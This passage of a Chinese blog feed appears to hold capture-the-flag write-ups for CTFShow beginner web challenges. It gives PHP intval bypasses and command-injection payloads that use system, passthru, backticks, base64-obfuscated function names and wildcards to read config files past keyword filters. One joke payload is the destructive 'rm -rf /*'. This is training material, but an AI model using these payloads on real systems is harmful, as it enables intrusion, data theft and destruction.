+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;42&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                    &lt;span class=&#34;c1&#34;&gt;// 42
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;+42&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                   &lt;span class=&#34;c1&#34;&gt;// 42
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-42&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                   &lt;span class=&#34;c1&#34;&gt;// -42
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mo&#34;&gt;042&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                     &lt;span class=&#34;c1&#34;&gt;// 34
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;042&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                   &lt;span class=&#34;c1&#34;&gt;// 42
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1e10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                    &lt;span class=&#34;c1&#34;&gt;// 1410065408
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1e10&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                  &lt;span class=&#34;c1&#34;&gt;// 1
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1A&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                    &lt;span class=&#34;c1&#34;&gt;// 26
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;42000000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                &lt;span class=&#34;c1&#34;&gt;// 42000000
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;420000000000000000000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;// 0
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;420000000000000000000&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 2147483647
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                   &lt;span class=&#34;c1&#34;&gt;// 42
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;42&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                 &lt;span class=&#34;c1&#34;&gt;// 34
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;                 &lt;span class=&#34;c1&#34;&gt;// 0
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;foo&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bar&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;// 1
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                   &lt;span class=&#34;c1&#34;&gt;// 0
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                    &lt;span class=&#34;c1&#34;&gt;// 1
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里利用了intval漏洞，我们可以传入一个字符串&#39;1000&#39;，这样就可以绕过了。除此之外要注意，输入的id最后是要拼接到sql语句上的，不过在MySQL中1000与&#39;1000&amp;rsquo;或者&amp;quot;1000&amp;quot;是等价的。&lt;/p&gt;
+&lt;p&gt;其他解：&lt;/p&gt;
+&lt;p&gt;​	这里可以使用多种位运算符来绕过&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;125&amp;lt;&amp;lt;3，利用左移运算符，经过计算后可以得到1000，并且在数据库中可以运行&lt;/li&gt;
+&lt;li&gt;680|320，992|8等，利用或运算符，经过计算可以得到1000，并且一样可以在数据库中使用&lt;/li&gt;
+&lt;li&gt;0b1111101000 ，使用二进制绕过，同上&lt;/li&gt;
+&lt;li&gt;0x3e8，这是使用16进制绕过，同上&lt;/li&gt;
+&lt;li&gt;992^8，144^888，200^800等，利用异或运算符，同上&lt;/li&gt;
+&lt;li&gt;~~1000，利用取反，两次取反即可绕过，同上&lt;/li&gt;
+&lt;li&gt;加减乘除运算符大家都可以自行尝试，这里就不过多赘述了&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;以上这些都是绕过intval的方法，后面几道题都是在web1的前提上加了正则过滤，大家请自行判断以上解中哪些可以使用。&lt;/p&gt;
+&lt;p&gt;另外除了这些还有其他各种非预期解，可以从sql的角度出发去考虑，例如id=id &amp;ndash; 等，有兴趣的可以自行研究。&lt;/p&gt;
+&lt;h2 id=&#34;web8&#34;&gt;web8&lt;/h2&gt;
+&lt;p&gt;这题算是一道梗题，仔细观察web1-8的题目描述可以看出是阿呆对抗黑客入侵的血泪史，在被一次次渗透之后，老板终于将阿呆辞退，于是就有了web8以及web8的描述“ 阿呆熟悉的一顿操作，去了埃塞尔比亚。 ”&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;title&amp;gt;ctf.show萌新计划web1&amp;lt;/title&amp;gt;
+    &amp;lt;meta charset=&amp;#34;utf-8&amp;#34;&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;?php
+# 包含数据库连接文件,key flag 也在里面定义
+include(&amp;#34;config.php&amp;#34;);
+# 判断get提交的参数id是否存在
+if(isset($_GET[&amp;#39;flag&amp;#39;])){
+        if(isset($_GET[&amp;#39;flag&amp;#39;])){
+                $f = $_GET[&amp;#39;flag&amp;#39;];
+                if($key===$f){
+                        echo $flag;
+                }
+        }
+}else{
+    highlight_file(__FILE__);
+}
+?&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;说道程序员跑路，自然少不了&lt;del&gt;经典操作&lt;/del&gt;删库，于是flag即为 rm -rf /*&lt;/p&gt;
+&lt;p&gt;payload：?flag= rm -rf /*&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;经 典 永 流 传&lt;/strong&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>CTFShow萌新计划web9-21</title>
+        <link>https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/</link>
+        <pubDate>Sun, 31 Jan 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/</guid>
+        <description>&lt;h2 id=&#34;web9&#34;&gt;web9&lt;/h2&gt;
+&lt;p&gt;题目描述： 阿呆在埃塞俄比亚终于找了一个网管的工作，闲暇时还能种点菜。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612075275397.png&#34;
+	width=&#34;667&#34;
+	height=&#34;347&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612075275397_huad7e6d0be6cca08fe5a7b1834034f939_27110_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612075275397_huad7e6d0be6cca08fe5a7b1834034f939_27110_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612075275397&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;192&#34;
+		data-flex-basis=&#34;461px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;逻辑十分简单，get一个c，必须要能匹配到system或者exec或者highlight，然后执行命令，提示flag在config.php中，那就直接构造?c=system(&amp;lsquo;cat config.php&amp;rsquo;);得到flag。&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;注：这里要说的是，system函数在执行命令的时候是有回显的，而exec是没有回显的，这点要注意。&lt;/em&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web10&#34;&gt;web10&lt;/h2&gt;
+&lt;p&gt;题目描述： 阿呆看见对面二黑急冲冲的跑过来，告诉阿呆出大事了，阿呆问什么事，二黑说：这几天天旱，你菜死了！&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612162931690.png&#34;
+	width=&#34;968&#34;
+	height=&#34;506&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612162931690_hu6f48801a0bd964a18990ac8b9551a42e_43986_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612162931690_hu6f48801a0bd964a18990ac8b9551a42e_43986_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612162931690&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;191&#34;
+		data-flex-basis=&#34;459px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;代码几乎没有变化，只是在正则匹配前面加了个!，意思也很明显，当c中没有这几个单词时才能执行命令。&lt;/p&gt;
+&lt;p&gt;这时我们需要其他命令执行函数，这里我们可以使用&lt;a class=&#34;link&#34; href=&#34;https://www.php.net/passthru&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;passthru&lt;/a&gt;函数，构造payload：?c=passthru(&amp;lsquo;cat config.php&amp;rsquo;);&lt;/p&gt;
+&lt;p&gt;然后查看源码得到flag。&lt;/p&gt;
+&lt;p&gt;这里也可以使用变量拼接，payload： ?c=$a=&amp;lsquo;sys&amp;rsquo;;$b=&amp;lsquo;tem&amp;rsquo;;$d=$a.$b;$d(&amp;lsquo;cat config.php&amp;rsquo;);&lt;/p&gt;
+&lt;p&gt;同样可以得到flag。&lt;/p&gt;
+&lt;p&gt;以下是一些命令执行函数：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;system()&lt;/li&gt;
+&lt;li&gt;passthru()&lt;/li&gt;
+&lt;li&gt;exec()&lt;/li&gt;
+&lt;li&gt;shell_exec()&lt;/li&gt;
+&lt;li&gt;popen()&lt;/li&gt;
+&lt;li&gt;proc_open()&lt;/li&gt;
+&lt;li&gt;pcntl_exec()&lt;/li&gt;
+&lt;li&gt;``反引号，在linux中反引号的作用就是将反引号内的Linux命令先执行，然后将执行结果赋予变量。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;web11&#34;&gt;web11&lt;/h2&gt;
+&lt;p&gt;题目描述： 阿呆听完自己菜死了，自己呆了。决定修好漏洞，绝对不能让自己再菜死了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612164415704.png&#34;
+	width=&#34;1020&#34;
+	height=&#34;502&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612164415704_hu24dbbefa6d252a1fe74c512e5b66be3c_44785_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612164415704_hu24dbbefa6d252a1fe74c512e5b66be3c_44785_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612164415704&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;203&#34;
+		data-flex-basis=&#34;487px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这次多过滤了一个cat，但是并没有起到什么作用，因为能够查看文件的命令有很多种，以下是常用的命令：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;tac：从最后一行开始显示，反向cat&lt;/li&gt;
+&lt;li&gt;more：一页一页显示内容&lt;/li&gt;
+&lt;li&gt;less：类似more&lt;/li&gt;
+&lt;li&gt;head：查看头几行&lt;/li&gt;
+&lt;li&gt;tail：查看尾几行&lt;/li&gt;
+&lt;li&gt;nl：显示内容，并且输出行号&lt;/li&gt;
+&lt;li&gt;od：以二进制方式显示内容&lt;/li&gt;
+&lt;li&gt;vi/vim：用编辑器查看&lt;/li&gt;
+&lt;li&gt;sort：显示内容&lt;/li&gt;
+&lt;li&gt;uniq：显示内容&lt;/li&gt;
+&lt;li&gt;grep： 在当前目录中，查找后缀有 php 字样的文件中包含 flag 字符串的文件，并打印出该字符串这行。例如：grep flag *php&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;构造payload：?c=passthru(&amp;lsquo;tac config.php&amp;rsquo;);&lt;/p&gt;
+&lt;h2 id=&#34;web12&#34;&gt;web12&lt;/h2&gt;
+&lt;p&gt;题目描述： 阿呆不慌不忙的拔掉自己所有的菜，以后自己就不会菜死了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612165965933.png&#34;
+	width=&#34;1235&#34;
+	height=&#34;512&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612165965933_hu187e065e36bf9eb7550328694aa60c59_47037_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612165965933_hu187e065e36bf9eb7550328694aa60c59_47037_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612165965933&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;241&#34;
+		data-flex-basis=&#34;578px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;好家伙把整个config.php给过滤了是吧。但是对我们构不成威胁。&lt;/p&gt;
+&lt;p&gt;在这里我们可以利用通配符来解决问题，只要给出开头，通配符就会自动匹配所需内容。&lt;/p&gt;
+&lt;p&gt;构造payload：?c=passthru(&amp;lsquo;tac con*&#39;);&lt;/p&gt;
+&lt;p&gt;*可以用来匹配多个字符，在linux中?也可用来匹配单个字符，所以也可以用?c=passthru(&amp;lsquo;tac confi?????&#39;);这里五个?正好匹配了g.php，&lt;del&gt;肥肠的方便，肥肠的好用&lt;/del&gt;。&lt;/p&gt;
+&lt;p&gt;c=$a = base64_decode(&amp;lsquo;c3lzdGVt&amp;rsquo;);$b=base64_decode(&amp;lsquo;Y2F0IGNvbmZpZy5waHA=&#39;);$a($b); 拼接法依然好用，这里用了base64的转换，可以直接绕过。&lt;/p&gt;
+&lt;p&gt;这里也可以使用grep，grep的优点在于可以一次输出多个文件，该题目文件夹下有index.php和config.php两个文件，使用?c=passthru(&amp;lsquo;grep flag *hp&amp;rsquo;);可以一次将两个文件下带有flag的字符串全部输出&lt;img src=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612166419996.png&#34;
+	width=&#34;1508&#34;
+	height=&#34;107&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612166419996_hu286f42a7f953c5c4538042877020daa1_20614_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612166419996_hu286f42a7f953c5c4538042877020daa1_20614_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612166419996&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1409&#34;
+		data-flex-basis=&#34;3382px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;（动态flag，不要直接输入）&lt;/p&gt;
+&lt;h2 id=&#34;web13&#34;&gt;web13&lt;/h2&gt;
+&lt;p&gt;题目描述： 阿呆彻底呆了，阿呆拿起谷姐搜索好久，终于找到更狠的方法。 &lt;img src=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612591302788.png&#34;
+	width=&#34;1573&#34;
+	height=&#34;601&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612591302788_hud81fc9fc54c73a5e5c23e5cc8b20ab6c_65185_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612591302788_hud81fc9fc54c73a5e5c23e5cc8b20ab6c_65185_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612591302788&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;261&#34;
+		data-flex-basis=&#34;628px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;其实只是多过滤一个分号而已。但如若不加分号命令便无法执行，自然无法拿到flag。&lt;/p&gt;
+&lt;p&gt;那这里该怎么办呢？我们可以看到这是个php页面，而php语言是必须要用&lt;!-- raw HTML omitted --&gt;来包括的，在?&amp;gt;之外的东西不会被解析，那么我们可以尝试将 &amp;lsquo;;&amp;rsquo; 转变为 &amp;lsquo;?&amp;gt;&amp;rsquo;&lt;/p&gt;
+&lt;p&gt;构造payload：c=passthru(&amp;lsquo;tac con*&#39;)?&amp;gt;&lt;/p&gt;
+&lt;p&gt;有同学可能会有疑问，因为即使闭合了&amp;lt;?php，但是这条语句依然没有分号，为什么这次可以运行。因为在php中，&lt;em&gt;&lt;strong&gt;分号不是必须的&lt;/strong&gt;&lt;/em&gt;，大家可以自行测试，很多语句不需分号依然可以执行，具体细则请大家自行查阅。&lt;/p&gt;
+&lt;h2 id=&#34;web14&#34;&gt;web14&lt;/h2&gt;
+&lt;p&gt;题目描述： 阿呆忍无可忍了，告诉自己，如果还被攻，自己就跳下去 。&lt;img src=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612592379363.png&#34;
+	width=&#34;1410&#34;
+	height=&#34;524&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612592379363_hueb0e5509ac305d234a1e3b7de7168f05_48571_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612592379363_hueb0e5509ac305d234a1e3b7de7168f05_48571_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612592379363&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;269&#34;
+		data-flex-basis=&#34;645px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;看看又多了什么。这次是多过滤了一个括号。&lt;/p&gt;
+&lt;p&gt;那不用括号便是。直接构造payload：?c=echo `tac con*`?&amp;gt; 轻松拿下。&lt;/p&gt;
+&lt;p&gt;&lt;del&gt;危 阿呆 危&lt;/del&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web15&#34;&gt;web15&lt;/h2&gt;
+&lt;p&gt;题目描述： 人为什么要活着？难道埃塞俄比亚再无我阿呆容身之处？&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612592704341.png&#34;
+	width=&#34;1387&#34;
+	height=&#34;430&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612592704341_huaa70a85755a95437cb292b887d22862d_47419_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612592704341_huaa70a85755a95437cb292b887d22862d_47419_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612592704341&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;322&#34;
+		data-flex-basis=&#34;774px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;阿呆逐渐熟练，这次通配符什么的都过滤了，看样子是没法直接拿到flag了。&lt;/p&gt;
+&lt;p&gt;这次我们构造这样的一个payload：?c=echo `$_POST[asuka]`; 进入该页面，什么都不会显示，我们构造的payload正等着接受post过来的数据呢，所以直接post：asuka=cat config.php ，查看页面源码即可找到flag。&lt;/p&gt;
+&lt;p&gt;注：这里若是直接使用hackbar可能会出错，因为hackbar在load URL的时候会将url转码，这是不行的，可以手动修改回去，或者直接使用burpsuit做。&lt;/p&gt;
+&lt;h2 id=&#34;web16&#34;&gt;web16&lt;/h2&gt;
+&lt;p&gt;题目描述： 阿呆为了自己的梦想(fulage)，决定来一波反向跑路。&lt;/p&gt;
+&lt;p&gt;啊，这道题没什么好说的。&lt;/p&gt;
+&lt;p&gt;payload：?c=36d	算是官方群里的梗吧，或者可以自己写个爆破脚本啥的，很麻烦就是了，不做讨论。&lt;/p&gt;
+&lt;h2 id=&#34;web17&#34;&gt;web17&lt;/h2&gt;
